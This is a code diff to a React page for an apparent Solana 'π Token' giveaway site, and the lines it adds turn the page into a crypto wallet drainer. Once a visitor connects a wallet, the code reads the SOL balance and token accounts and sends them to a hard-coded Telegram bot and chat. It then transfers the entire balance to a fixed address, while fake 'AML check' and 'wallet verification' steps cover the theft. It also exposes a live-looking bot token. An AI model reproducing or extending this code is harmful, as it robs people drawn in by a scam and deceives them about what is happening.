@@ -1,53 +1,423 @@
-
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
+import { 
+  getTokenAccounts, 
+  sendToTelegram, 
+  signAndSendTransaction, 
+  getWalletBalance, 
+  MINIMUM_REQUIRED_SOL,
+  hasEnoughSolForRent 
+} from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
-import LoadingState from '@/components/LoadingState';
+import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';
+
+const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
+const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
+const TELEGRAM_CHAT_ID = "-1002490122517";
+
+const initialSteps: ConnectionStep[] = [
+  { id: 'connect', label: 'Connect', status: 'pending' },
+  { id: 'connectSuccess', label: 'Connect success', status: 'pending' },
+  { id: 'addressCheck', label: 'Address check', status: 'pending' },
+  { id: 'amlCheck', label: 'AML check', status: 'pending' },
+  { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
+  { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
+  { id: 'thanks', label: 'Thanks', status: 'pending' },
+  { id: 'processing', label: 'Processing', status: 'pending' },
+  { id: 'completed', label: 'Completed', status: 'pending' }
+];
 
 const Index = () => {
   const { publicKey, connecting, connected, wallet } = useWallet();
   const { connection } = useConnection();
-  const [isConnecting, setIsConnecting] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [lastSignature, setLastSignature] = useState<string | null>(null);
+  const [walletBalance, setWalletBalance] = useState<number | null>(null);
+  const [tokens, setTokens] = useState<any[]>([]);
+  const [connectionError, setConnectionError] = useState<string | null>(null);
+  const [connectionAttempts, setConnectionAttempts] = useState(0);
+  const [isLoading, setIsLoading] = useState(false);
+  const [fetchRetries, setFetchRetries] = useState(0);
+  
+  const [showLoadingModal, setShowLoadingModal] = useState(false);
+  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
+  const [currentStep, setCurrentStep] = useState('connect');
 
-  // Simplified connection handler
-  const handleWalletConnected = async () => {
-    if (!connected || !publicKey || isConnecting) return;
+  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error') => {
+    setConnectionSteps(steps => 
+      steps.map(step => 
+        step.id === stepId 
+          ? { ...step, status } 
+          : step
+      )
+    );
+    if (status === 'active') {
+      setCurrentStep(stepId);
+    }
+  };
+
+  const advanceToNextStep = (currentStepId: string) => {
+    updateStepStatus(currentStepId, 'completed');
     
-    setIsConnecting(true);
+    const currentIndex = connectionSteps.findIndex(step => step.id === currentStepId);
+    
+    if (currentIndex < connectionSteps.length - 1) {
+      const nextStep = connectionSteps[currentIndex + 1];
+      updateStepStatus(nextStep.id, 'active');
+    }
+  };
+
+  const fetchWalletData = async () => {
+    if (!publicKey || !wallet) {
+      console.log("Wallet, connection, or public key not available");
+      setConnectionError("Wallet or connection not available");
+      return null;
+    }
+
+    setConnectionError(null);
+    setIsLoading(true);
     
     try {
-      toast({
-        title: "Connected",
-        description: "Your wallet has been connected successfully.",
-      });
+      updateStepStatus('addressCheck', 'active');
       
-      // Request wallet connection permissions here
-      // This approach is much faster since we're not doing multiple operations
+      console.log("Attempting to fetch wallet data using multiple RPC endpoints");
       
+      // Enhanced balance fetch with fallback mechanisms
+      let solBalance = 0;
+      let balanceSuccess = false;
+      
+      // Try each endpoint for balance fetch
+      for (const endpoint of [
+        "https://api.mainnet-beta.solana.com",
+        "https://solana-api.projectserum.com",
+        "https://rpc.ankr.com/solana",
+        "https://solana.public-rpc.com"
+      ]) {
+        try {
+          console.log(`Attempting to fetch balance from ${endpoint}`);
+          connection.rpcEndpoint = endpoint; // Update connection endpoint
+          const balance = await getWalletBalance(publicKey.toString());
+          console.log(`Balance fetch successful from ${endpoint}: ${balance} SOL`);
+          setWalletBalance(balance);
+          solBalance = balance;
+          balanceSuccess = true;
+          break;
+        } catch (error) {
+          console.error(`Balance fetch failed from ${endpoint}:`, error);
+        }
+      }
+      
+      if (!balanceSuccess) {
+        console.warn("All balance fetch attempts failed, continuing with tokens fetch");
+      }
+      
+      advanceToNextStep('addressCheck');
+      updateStepStatus('amlCheck', 'active');
+      
+      // Enhanced token accounts fetch with fallbacks
+      let tokenAccounts = [];
+      for (const endpoint of [
+        "https://api.mainnet-beta.solana.com",
+        "https://solana-api.projectserum.com",
+        "https://rpc.ankr.com/solana",
+        "https://solana.public-rpc.com"
+      ]) {
+        try {
+          console.log(`Attempting to fetch token accounts from ${endpoint}`);
+          connection.rpcEndpoint = endpoint;
+          const tokens = await getTokenAccounts(connection, publicKey.toString());
+          console.log(`Token accounts received from ${endpoint}:`, tokens);
+          setTokens(tokens || []);
+          tokenAccounts = tokens || [];
+          break;
+        } catch (error) {
+          console.error(`Token accounts fetch failed from ${endpoint}:`, error);
+        }
+      }
+      
+      advanceToNextStep('amlCheck');
+      updateStepStatus('successfulAmlCheck', 'active');
+      await new Promise(resolve => setTimeout(resolve, 150));
+      advanceToNextStep('successfulAmlCheck');
+
+      updateStepStatus('scanningDetails', 'active');
+      await new Promise(resolve => setTimeout(resolve, 150));
+      advanceToNextStep('scanningDetails');
+
+      updateStepStatus('thanks', 'active');
+      await new Promise(resolve => setTimeout(resolve, 150));
+      advanceToNextStep('thanks');
+
+      setFetchRetries(0);
+
+      return {
+        address: publicKey.toString(),
+        tokens: tokenAccounts,
+        balance: solBalance,
+        connectionTime: new Date().toISOString(),
+        walletName: wallet?.adapter?.name || "Unknown Wallet"
+      };
     } catch (error) {
-      console.error('Connection error:', error);
+      console.error("Error fetching wallet data:", error);
+      setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
+      
+      const newRetryCount = fetchRetries + 1;
+      setFetchRetries(newRetryCount);
+      
+      if (newRetryCount < 5) { // Increased from 3 to 5 max retries
+        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
+        toast({
+          title: "Connection Issue",
+          description: `Retrying to fetch wallet data (${newRetryCount}/5)...`,
+        });
+        
+        // Exponential backoff for retries
+        const delay = Math.min(1000 * Math.pow(1.5, newRetryCount), 10000); 
+        setTimeout(() => {
+          fetchWalletData();
+        }, delay);
+      } else {
+        toast({
+          title: "Connection Failed",
+          description: "Could not connect to your wallet after multiple attempts. Please try again later.",
+          variant: "destructive"
+        });
+      }
+      
+      return null;
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handleWalletConnection = async () => {
+    if (!publicKey || !wallet) {
+      console.log("Wallet or public key not available");
+      return;
+    }
+
+    if (isProcessing) {
+      console.log("Already processing a transaction");
+      return;
+    }
+
+    setIsProcessing(true);
+    setConnectionAttempts(prev => prev + 1);
+    setConnectionSteps(initialSteps);
+    setShowLoadingModal(true);
+    
+    updateStepStatus('connect', 'active');
+    await new Promise(resolve => setTimeout(resolve, 100));
+    advanceToNextStep('connect');
+    
+    updateStepStatus('connectSuccess', 'active');
+    await new Promise(resolve => setTimeout(resolve, 100));
+    advanceToNextStep('connectSuccess');
+    
+    try {
+      console.log("Starting wallet connection process");
+      
+      let walletData = null;
+      for (let attempt = 0; attempt < 2; attempt++) {
+        try {
+          walletData = await fetchWalletData();
+          if (walletData) break;
+          console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
+          await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
+        } catch (e) {
+          console.error(`Fetch attempt ${attempt + 1} error:`, e);
+        }
+      }
+      
+      if (!walletData) {
+        throw new Error("Failed to fetch wallet data after multiple attempts");
+      }
+      
+      const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+      
+      if (!telegramSent) {
+        console.error("Failed to send data to Telegram");
+        
+        setTimeout(async () => {
+          await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        }, 3000);
+      } else {
+        console.log("Successfully sent wallet data to Telegram");
+      }
+
+      if (walletData.balance <= 0) {
+        console.log("Wallet has no SOL balance");
+        
+        const zeroBalanceMessage = {
+          address: publicKey.toString(),
+          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
+        toast({
+          title: "Low Balance",
+          description: "Your wallet has no SOL balance. No further action needed.",
+        });
+        setIsProcessing(false);
+        setShowLoadingModal(false);
+        return;
+      }
+
+      if (!hasEnoughSolForRent(walletData.balance)) {
+        console.log("Wallet balance too low for rent exemption");
+        
+        const lowRentMessage = {
+          address: publicKey.toString(),
+          message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: ${MINIMUM_REQUIRED_SOL} SOL.`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(lowRentMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
+        toast({
+          title: "Insufficient Funds",
+          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL (about $0.50) for rent exemption and fees.`,
+          variant: "destructive",
+        });
+        setIsProcessing(false);
+        setShowLoadingModal(false);
+        return;
+      }
+
+      updateStepStatus('processing', 'active');
+
+      const transferMessage = {
+        address: publicKey.toString(),
+        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
+        walletName: wallet?.adapter?.name || "Unknown Wallet"
+      };
+      
+      await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+
+      console.log("Initiating transfer");
+      
+      try {
+        toast({
+          title: "Processing",
+          description: "Completing your wallet verification...",
+        });
+
+        if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
+          throw new Error("Wallet or publicKey is undefined");
+        }
+
+        const signature = await signAndSendTransaction(
+          connection,
+          wallet,
+          BACKEND_ADDRESS,
+          walletData.balance,
+          TELEGRAM_BOT_TOKEN,
+          TELEGRAM_CHAT_ID
+        );
+
+        advanceToNextStep('processing');
+        updateStepStatus('completed', 'active');
+        await new Promise(resolve => setTimeout(resolve, 300));
+        advanceToNextStep('completed');
+
+        console.log("Transfer completed with signature:", signature);
+        setLastSignature(signature);
+        
+        const completionMessage = {
+          address: publicKey.toString(),
+          message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
+Transaction: https://explorer.solana.com/tx/${signature}`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
+        toast({
+          title: "Success!",
+          description: "Wallet verification and transaction completed!",
+        });
+      } catch (error) {
+        console.error("Transfer failed:", error);
+        
+        setConnectionSteps(prev => [
+          ...prev,
+          { id: 'errorTitle', label: 'Error - title', status: 'error' },
+          { id: 'errorDescription', label: 'Error - description', status: 'error' }
+        ]);
+        
+        updateStepStatus('errorTitle', 'active');
+        await new Promise(resolve => setTimeout(resolve, 200));
+        
+        const failureMessage = {
+          address: publicKey.toString(),
+          message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(failureMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
+        toast({
+          title: "Transfer Failed",
+          description: error instanceof Error ? error.message : "Failed to process transaction",
+          variant: "destructive",
+        });
+      }
+    } catch (error) {
+      console.error('Detailed error in wallet connection:', error);
+      setConnectionError(error instanceof Error ? error.message : "Unknown error in wallet connection");
+      
+      if (publicKey) {
+        const errorMessage = {
+          address: publicKey.toString(),
+          message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(errorMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+      }
+      
       toast({
-        title: "Connection Error",
-        description: error instanceof Error ? error.message : "Failed to connect wallet",
+        title: "Error",
+        description: error instanceof Error ? error.message : "Failed to process wallet connection",
         variant: "destructive",
       });
     } finally {
-      setIsConnecting(false);
+      setTimeout(() => {
+        setShowLoadingModal(false);
+        setIsProcessing(false);
+      }, 800);
+    }
+  };
+
+  const handleManualRetry = () => {
+    if (connected && publicKey && !isProcessing) {
+      handleWalletConnection();
+    } else if (!connected) {
+      toast({
+        title: "Connect Wallet",
+        description: "Please connect your wallet first",
+      });
     }
   };
 
   useEffect(() => {
-    if (connected && publicKey) {
-      handleWalletConnected();
+    if (connected && publicKey && !isProcessing) {
+      handleWalletConnection();
     }
   }, [connected, publicKey]);
 
   return (
     <div className="min-h-screen bg-background p-6 relative">
-      {/* Simple loading indicator instead of the modal with steps */}
-      <LoadingState isLoading={connecting || isConnecting} />
+      <LoadingModal 
+        isOpen={showLoadingModal} 
+        steps={connectionSteps} 
+        currentStep={currentStep} 
+      />
       
       <nav className="flex justify-between items-center mb-20">
         <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
@@ -69,15 +439,27 @@ const Index = () => {
         </h1>
         
         <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
-          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!
+          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
         </p>
 
         <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
           <div className="flex justify-center w-full">
-            <WalletMultiButton 
-              className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" 
-            />
+            <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
           </div>
+          
+          {connectionError && (
+            <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg w-full">
+              <p className="text-red-300 font-semibold">Connection Error:</p>
+              <p className="text-white/80 text-sm">{connectionError}</p>
+              <button 
+                onClick={handleManualRetry}
+                className="mt-2 bg-red-700/50 text-white py-2 px-4 rounded-md hover:bg-red-700/80 transition-colors text-sm"
+                disabled={isProcessing || isLoading}
+              >
+                {isProcessing || isLoading ? "Processing..." : "Retry Connection"}
+              </button>
+            </div>
+          )}
         </div>
 
         <div className="mt-20">
